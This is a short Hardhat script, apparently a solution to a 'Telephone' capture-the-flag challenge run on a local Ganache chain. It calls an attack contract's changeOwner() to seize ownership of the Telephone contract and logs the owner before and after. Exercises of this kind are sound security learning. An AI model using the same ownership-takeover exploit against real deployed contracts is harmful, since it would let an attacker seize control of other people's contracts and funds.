// Claim ownership of the Telephone contract

// Solution developed using Ganache

const hre = require("hardhat");

async function main() {
  const TelephoneAddress = "0xcD4Ef31c20515B5ecE0797Adf349A6d98F67a16b"
  this.telephone = await hre.ethers.getContractAt("Telephone",TelephoneAddress);

  const TelephoneAttackAddress = "0x6c25b116c230079cdfc9D61C51CE6630691FaA6D"
  this.telephoneAttack = await hre.ethers.getContractAt("TelephoneAttack",TelephoneAttackAddress);

  [macias, ganacheAccount] = await ethers.getSigners();

  console.log(
    `
    Telephone contract address: ${await this.telephone.address} \n
    Telephone original owner: ${await this.telephone.owner()}
    `
  );

  console.log(
    `Telephone contract to be attacked: ${await this.telephoneAttack.telephoneAddress()}`
    );
  
  console.log("\n\n Performing attack ... \n\n");

  // Taking ownership of the Telephone contract
  await this.telephoneAttack.connect(macias).changeOwner();

  console.log("\n\n Results after performing the attack \n\n");

  console.log(
    `
    Telephone contract address: ${await this.telephone.address} \n
    Telephone new owner: ${await this.telephone.owner()} \n
    Macias account's address: ${await macias.address}
    `
  );



}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});